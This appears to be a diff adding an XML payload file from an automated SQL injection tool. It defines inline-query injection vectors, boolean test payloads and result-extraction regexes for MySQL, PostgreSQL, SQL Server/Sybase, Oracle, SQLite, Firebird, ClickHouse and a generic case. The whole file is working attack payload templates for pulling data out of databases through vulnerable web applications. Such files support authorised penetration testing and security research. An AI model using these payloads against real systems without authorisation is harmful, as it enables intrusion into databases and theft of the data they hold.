@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <!-- Inline queries tests -->
+    <test>
+        <title>Generic inline queries</title>
+        <stype>3</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT CONCAT(CONCAT('[DELIMITER_START]',([QUERY])),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>(SELECT CONCAT(CONCAT('[DELIMITER_START]',(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+    </test>
+
+    <test>
+        <title>MySQL inline queries</title>
+        <stype>3</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(ELT([RANDNUM]=[RANDNUM],1)),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL inline queries</title>
+        <stype>3</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase inline queries</title>
+        <stype>3</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'+(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)+'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle inline queries</title>
+        <stype>3</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)</vector>
+        <request>
+            <!-- NOTE: Vertica works too without the TO_NUMBER() -->
+            <payload>(SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'[DELIMITER_STOP]' FROM DUAL)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SQLite inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'</vector>
+        <request>
+            <payload>SELECT '[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)||'[DELIMITER_STOP]'</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>SQLite</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Firebird inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE</vector>
+        <request>
+            <payload>SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+    
+    <!-- End of inline queries tests -->
+</root>
